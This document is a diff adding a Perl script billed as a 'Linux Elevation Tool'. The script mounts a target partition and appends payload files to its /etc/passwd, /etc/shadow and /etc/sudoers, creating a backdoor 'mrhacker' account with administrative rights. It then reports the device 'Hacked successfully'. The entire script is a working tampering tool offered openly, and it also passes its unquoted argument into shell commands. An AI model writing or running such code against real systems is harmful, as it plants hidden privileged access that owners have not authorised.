@@ -1,0 +1,20 @@
+#!/usr/bin/perl
+#Coded By Z3R0#
+$dev=$ARGV[0]; 
+
+if( $ARGV[0] eq '-h' || $ARGV[0] eq '--help' || $ARGV[0] eq '') {
+print "Linux Elevation Tool\n\n";
+print "Usage: lelev <TargetPartition>\n\n";
+print "Ex: https://github.com/YSpoof/lelev\n";
+exit; }
+
+system("mkdir -p /tmp/rootsploit");
+system("mount $dev /tmp/rootsploit");
+system("mkdir -p /tmp/rootsploit/home/mrhacker");
+system("cp -R /tmp/rootsploit/etc/skel /tmp/rootsploit/home/mrhacker");
+system("cat /opt/exploits/linprivescal/payload >> /tmp/rootsploit/etc/passwd");
+system("cat /opt/exploits/linprivescal/payload2 >> /tmp/rootsploit/etc/shadow");
+system("cat /opt/exploits/linprivescal/payload3 >> /tmp/rootsploit/etc/sudoers");
+system("umount $dev");
+print("$dev Hacked successfully!\n"); 
+exit;
